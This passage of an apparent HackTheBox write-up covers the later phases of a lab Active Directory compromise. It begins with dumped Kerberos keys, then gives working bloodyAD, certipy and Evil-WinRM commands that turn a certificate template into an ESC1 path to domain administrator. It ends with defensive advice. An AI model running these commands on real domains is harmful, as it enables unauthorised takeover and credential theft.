A.Pearson:aes256-cts-hmac-sha1-96:537543f5f783db4a10f4df73e87ec7df9c692df7d970e3ee4be08c76fa53d5e7
A.Pearson:aes128-cts-hmac-sha1-96:a3a9b0fa5a8dab39c2971bab470386a7
A.Pearson:des-cbc-md5:3becd6ae4a26bf89
P.Sanchez:aes256-cts-hmac-sha1-96:12fb2b9eb168304707d6ef260269445089928f2861a8f58e54fea85e9ab5309e
P.Sanchez:aes128-cts-hmac-sha1-96:b0f0baa47311cee88ca2b52b4e8ceb49
P.Sanchez:des-cbc-md5:83dc2cc7fb5dfb57
H.Gordon:aes256-cts-hmac-sha1-96:f540010f801f234d6e1373e5a628184bf658f87f8ac510ad772300d883b300a0
H.Gordon:aes128-cts-hmac-sha1-96:24977a9c20ff0ae29914f4f882d9b0db
H.Gordon:des-cbc-md5:1a7af2c83d46e9cd
P.Reiner:aes256-cts-hmac-sha1-96:558139b55509c8a6fefe5f493f7a316cd6ab23b6eb1770c4a81934f25b6b700d
P.Reiner:aes128-cts-hmac-sha1-96:3e6a72a9be1789fd6ea0b8b9b3306c19
P.Reiner:des-cbc-md5:d5bad657b55132df
C.Adam:aes256-cts-hmac-sha1-96:647d77f0b0b0ebd22689a316339a4242044556182e3fb3c2b7bc5ffc29b1b8c4
C.Adam:aes128-cts-hmac-sha1-96:e550f93fa28e7d7196d98534c1a787ea
C.Adam:des-cbc-md5:806dc84034e6dcef
R.Rupert:aes256-cts-hmac-sha1-96:c0dfecbe5140831b99750a5c68f3ea55e3474d15caa3cc684c9a5c0be8fc4eab
R.Rupert:aes128-cts-hmac-sha1-96:e034d0c375a79fa55f36bad49760fabf
R.Rupert:des-cbc-md5:9dbca10268fddc07
svc_sql:aes256-cts-hmac-sha1-96:04268c99f2fa7c1494eb690f151dbca811659fbb2f91507af68d14ea767299a4
svc_sql:aes128-cts-hmac-sha1-96:e2823bb8675e717c06220991e69ac1b6
svc_sql:des-cbc-md5:1c3bbf5145863858
svc_print:aes256-cts-hmac-sha1-96:f9bd97d0d297630c1b1e85dd2a94a827332e2328d74141a6bafa0aa00aec0544
svc_print:aes128-cts-hmac-sha1-96:9b87341cfde9d6f5832be8fc6718126f
svc_print:des-cbc-md5:765b3434f7e9312c
svc_ldap:aes256-cts-hmac-sha1-96:cfad16d6a69c32b7a78a203485f740d132fb8713d1477d81162eac62ced1bf0b
svc_ldap:aes128-cts-hmac-sha1-96:17b3dbc9341f30adf89d67285bc5cb88
svc_ldap:des-cbc-md5:5792c71945c80bd9
R.Martinelli:aes256-cts-hmac-sha1-96:61e48d17cfe9507a3095dfb84b218a4b803aa0984b123e432bc2a40fc5f7fe98
R.Martinelli:aes128-cts-hmac-sha1-96:14f94b4b3deaabde802460945a2079e9
R.Martinelli:des-cbc-md5:8c437f1f578f3b3b
DC2$:aes256-cts-hmac-sha1-96:486c88bea5be139e8a271864ac2ff0216d7ccb003b5eb61f2976071490515848
DC2$:aes128-cts-hmac-sha1-96:debc5c93eb20fca6eb01887a5f2104a8
DC2$:des-cbc-md5:16abe5405d2f51ef
Pong_gMSA$:aes256-cts-hmac-sha1-96:ed68745b50de7045981c8199540ea1966ff84fb7f09f042cc227f6c114ef97e0
Pong_gMSA$:aes128-cts-hmac-sha1-96:13d374fcef1cf3403c9e5b90b1796e06
Pong_gMSA$:des-cbc-md5:6b0d1a43ec9b0176
PING$:aes256-cts-hmac-sha1-96:019fa4507d1a273e258416cd8ec29521f72c7c035cfa8f1fc533a56946b511bb
PING$:aes128-cts-hmac-sha1-96:2bdd76b6f6c8a0704580dbbffb314524
PING$:des-cbc-md5:6bbc13dc107f010d
[*] Cleaning up... 
```

DC2 is now fully compromised, and the secrets dump gives us an entire domain's worth of credentials — including the AES256 key for **`R.Martinelli`**, the foreign principal BloodHound flagged much earlier as a member of `CA Managers@PING.HTB`. The only remaining question is how to convert this PONG-side compromise back into control over PING.

# Phase 13 — Returning to PING.HTB via R.Martinelli

## Identifying the Cross-Forest Link

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252F6OJzOsaTxBHLzrQF6fON%252FScreenshot%2520%283206%29.png%3Falt%3Dmedia%26token%3D1212634a-ed98-404b-a9ad-68b5f5f22c3a&width=768&dpr=3&quality=100&sign=b0e2cf1061e2c766afa7eafd4402fe4a&sv=3)

This graph confirms `R.Martinelli@PONG.HTB` is a member of `CA Managers@PING.HTB`, which in turn holds `WriteOwner` over the `SmartcardAuthentication` certificate template — exactly the foreign-principal membership we spotted at the very start of AD CS enumeration, with the mysterious SID ending in `-1124` now identified by name. This account is the bridge that has presence on both sides of the trust: a `PONG.HTB` identity with delegated control inside `PING.HTB`'s certificate infrastructure.

With `R.Martinelli`'s AES256 key recovered from the DC2 secrets dump

`61e48d17cfe9507a3095dfb84b218a4b803aa0984b123e432bc2a40fc5f7fe98`

we can authenticate as this principal, inherit its `CA Managers` membership, and abuse the `WriteOwner` right to escalate through AD CS one more time.

The delegated permissions on `SmartcardAuthentication` are:

* `WriteOwner`
* `WriteDacl`
* `GenericWrite`

Having write control over a certificate template's security descriptor is the textbook definition of **ESC4** — it means we can reconfigure the template's own settings, potentially turning an otherwise safe template into something abusable, such as an **ESC1**-style template.

## Authenticating as R.Martinelli

```shell
┌──(kuroshiro㉿a1sberg)-[~/HTB/PingPong]
└─$ impacket-getTGT -aesKey 61e48d17cfe9507a3095dfb84b218a4b803aa0984b123e432bc2a40fc5f7fe98 -dc-ip 192.168.2.2 'pong.htb/r.martinelli'      
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in r.martinelli.ccache
```

With this ticket, we can interact with `PING.HTB` across the existing cross-forest trust.

# Phase 14 — Chaining ESC4 into ESC1 for Domain Admin

## Inspecting the SmartcardAuthentication Template

Before touching anything, we look at the template's current configuration:

```json
"12": {
    "Template Name": "SmartcardAuthentication",
    "Display Name": "Smartcard Authentication",
    "Certificate Authorities": [
        "ping-DC1-CA"
        ],
    "Enabled": true,
    "Client Authentication": true,
    "Enrollment Agent": false,
    "Any Purpose": false,
    "Enrollee Supplies Subject": false,
    "Certificate Name Flag": [
            33554432,
            536870912,
            2147483648
        ],
    "Enrollment Flag": [
            1,
            8,
            32
        ],
    "Private Key Flag": [
            16
        ],
    "Extended Key Usage": [
            "Client Authentication",
            "Secure Email",
            "Encrypting File System"
        ],
    "Requires Manager Approval": false,
    "Requires Key Archival": false,
    "Authorized Signatures Required": 0,
    "Schema Version": 2,
    "Validity Period": "100 years",
    "Renewal Period": "6 weeks",
    "Minimum RSA Key Length": 2048,
    "Template Created": "2026-01-17 15:39:18+00:00",
    "Template Last Modified": "2026-01-17 15:39:37+00:00",
    "Permissions": {
    "Enrollment Permissions": {
        "Enrollment Rights": [
            "PING.HTB\\Domain Admins",
            "PING.HTB\\Enterprise Admins"
        ]
    },
    "Object Control Permissions": {
      "Owner": "PING.HTB\\Administrator",
      "Full Control Principals": [
            "PING.HTB\\Domain Admins",
            "PING.HTB\\Enterprise Admins"
          ],
      "Write Owner Principals": [
            "PING.HTB\\Domain Admins",
            "PING.HTB\\Enterprise Admins"
          ],
      "Write Dacl Principals": [
            "PING.HTB\\Domain Admins",
            "PING.HTB\\Enterprise Admins"
          ],
      "Write Property Enroll": [
            "PING.HTB\\Domain Admins",
            "PING.HTB\\Enterprise Admins"
        ]
    }
}
```

At first glance, this template isn't directly exploitable. `Client Authentication = true` means certificates from it can be used for Kerberos authentication — a necessary ingredient — but `Enrollee Supplies Subject = false` blocks the classic **ESC1** move of requesting a certificate for an arbitrary identity: the CA will only bind the certificate to whichever account actually requested it. Enrollment is also restricted to `Domain Admins` and `Enterprise Admins`, so ordinary users can't even request from this template in the first place.

Two properties are already favorable, though: `Requires Manager Approval = false` and `Authorized Signatures Required = 0`. Nobody needs to manually approve or co-sign a request. So the only real barriers left are the subject restriction and the narrow enrollment list — both of which are governed by the template's security descriptor, which `R.Martinelli` now controls.

## Modifying Template Security & Flags

The plan is to strip both restrictions:

1. Allow the requester to supply their own certificate subject.
2. Widen enrollment beyond Domain/Enterprise Admins.

Once both changes land, the template's existing **Client Authentication** EKU becomes usable to authenticate as an arbitrary identity — turning it into an ESC1-equivalent template on the fly.

Before making any changes, we confirm `R.Martinelli` can actually reach DC1 across the trust by requesting an LDAP service ticket:

```shell
┌──(kuroshiro㉿a1sberg)-[~/HTB/PingPong]
└─$ KRB5CCNAME='r.martinelli.ccache' kvno ldap/dc1.ping.htb 
ldap/dc1.ping.htb@PING.HTB: kvno = 7
```

The successful response confirms the cross-domain Kerberos path is functioning, so we proceed with the first modification: flipping `msPKI-Certificate-Name-Flag` so the CA no longer forces the certificate identity to match the requesting account, but instead accepts a subject supplied by the requester (setting the `ENROLLEE_SUPPLIES_SUBJECT` bit). With that in place, a request can specify an arbitrary UPN such as:

```text
Administrator@ping.htb
```

This single flag change is the crux of what makes an **ESC1**-style attack possible.

Next, we widen enrollment by granting **Authenticated Users** (`S-1-5-11`) full control over the template object itself:

```shell
┌──(kuroshiro㉿a1sberg)-[~/HTB/PingPong]
└─$ bloodyAD -d ping.htb --host dc1.ping.htb -u r.martinelli -k ccache=r.martinelli.ccache add genericAll 'CN=SmartcardAuthentication,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=ping,DC=htb' 'S-1-5-11'                                                         
[+] S-1-5-11 has now GenericAll on CN=SmartcardAuthentication,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=ping,DC=htb
```

Rather than adding a single privileged group, this opens the template up to every authenticated user in the domain — including our original `c.roberts` account. At this point, the **ESC4** phase of the attack is complete: we used delegated control over a certificate template's security descriptor to rewrite it into an **ESC1-compatible** configuration.

## Requesting a Certificate as the PING Administrator

With the template reconfigured, we go back to using `c.roberts` — the very first account we compromised — to request a certificate impersonating the domain administrator:

```text
UPN: Administrator@ping.htb
SID: S-1-5-21-750635624-2058721901-1932338391-500
```

```shell
┌──(kuroshiro㉿a1sberg)-[~/HTB/PingPong]
└─$ KRB5CCNAME='c.roberts.ccache' certipy-ad req -k -no-pass -target dc1.ping.htb -dc-host dc1.ping.htb -dc-ip 10.129.245.56 -ca ping-DC1-CA -template SmartcardAuthentication -upn 'Administrator@ping.htb' -sid 'S-1-5-21-750635624-2058721901-1932338391-500' 
Certipy v5.1.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 18
[*] Successfully requested certificate
[*] Got certificate with UPN 'Administrator@ping.htb'
[*] Certificate object SID is 'S-1-5-21-750635624-2058721901-1932338391-500'
[*] Saving certificate and private key to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'
```

The CA issues a certificate carrying the **Administrator's identity**, even though `c.roberts` is the one who requested it — exactly what the modified template now allows. We convert that certificate into a Kerberos TGT:

```shell
┌──(kuroshiro㉿a1sberg)-[~/HTB/PingPong]
└─$ certipy-ad auth -pfx administrator.pfx -username Administrator -domain ping.htb -dc-ip 10.129.245.56                                                                                    
Certipy v5.1.0 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'Administrator@ping.htb'
[*]     SAN URL SID: 'S-1-5-21-750635624-2058721901-1932338391-500'
[*]     Security Extension SID: 'S-1-5-21-750635624-2058721901-1932338391-500'
[*] Using principal: 'administrator@ping.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'administrator.ccache'
[*] Wrote credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@ping.htb': aad3b435b51404eeaad3b435b51404ee:63905deb12b527aadfdbc26d3f423eff
```

The domain controller accepts the certificate, and Certipy successfully retrieves both a TGT and the NT hash for `Administrator@ping.htb`.

# Phase 15 — Full Domain Compromise

The attack chain has now come full circle. We started in `PING.HTB` as `c.roberts`, crossed into `PONG.HTB`, compromised `DC2`, recovered `R.Martinelli`'s credentials from the resulting secrets dump, and used that account's delegated AD CS rights against `PING.HTB`'s certificate infrastructure. By turning `SmartcardAuthentication` into an ESC1-style template (ESC4) and then requesting a certificate as `c.roberts` with the Administrator's identity, we obtained a fully valid Administrator TGT — bringing us back to `PING.HTB` with complete domain control.

We use the resulting Kerberos cache to open an Evil-WinRM session against DC1:

```shell
┌──(kuroshiro㉿a1sberg)-[~/HTB/PingPong]
└─$ KRB5CCNAME='administrator.ccache' evil-winrm -i dc1.ping.htb -r PING.HTB 
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline                                                                              
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion                                                                                         
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
ping\administrator
```

And retrieve the final proof of compromise:

```text
*Evil-WinRM* PS C:\Users\Administrator\Documents> cat ../Desktop/root.txt
[REDACTED]
```

# Conclusion

PingPong is a masterclass in how far a single low-privileged foothold can travel through a well-designed multi-forest Active Directory environment once NTLM is taken off the table. Every step of the chain had to be re-derived through Kerberos — TGTs, cross-realm service tickets, AES keys instead of NT hashes, and PKINIT certificate authentication — which made time synchronization and careful `krb5.conf` management just as important as any single exploit.

What made this box genuinely "Insane" wasn't any one exploit in isolation; ESC13, gMSA abuse, JEA/PSRP, RBCD, and ESC4→ESC1 are each individually well-documented techniques. The difficulty came from **chaining** them correctly across a forest trust boundary, where SIDs had to substitute for usernames, group scopes had to be converted (Global → Universal → Domain Local) just to add a foreign member, and a foreign security principal's cross-domain group membership became the hinge connecting two otherwise separate compromises.

The recurring lesson throughout is that **Active Directory Certificate Services deserves the same scrutiny as any other privilege-escalation surface**. It was the way in (ESC13, via an issuance-policy-linked template), and it was the way back to full Domain Admin (ESC4 → ESC1, via delegated template ownership). Anywhere a template's enrollment rights, subject-name flags, or security descriptor are looser than they need to be, AD CS quietly becomes an alternate — and often overlooked — path to compromise.

From a defensive standpoint, this box is a strong argument for: auditing certificate template permissions and issuance-policy-to-group links, enforcing least privilege on `GenericWrite`/`WriteOwner` grants across forest trusts, monitoring gMSA password reads and group `groupType` changes, disabling `xp_cmdshell` unless explicitly required, and never leaving credentials sitting in PowerShell history files.
